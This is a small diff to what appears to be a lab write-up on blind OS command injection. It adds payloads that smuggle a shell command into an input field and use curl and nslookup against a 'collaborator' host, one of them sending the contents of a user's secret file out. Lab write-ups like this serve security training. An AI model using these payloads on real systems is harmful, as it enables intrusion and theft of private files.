@@ -16,5 +16,9 @@
 payload:
 
 ```text
-||curl+collaborator+-d+`whoami`||
+||curl+collaborator+-d+`cat+/home/carlos/secret`||
+```
+
+```text
+||nslookup+collaborator||
 ```
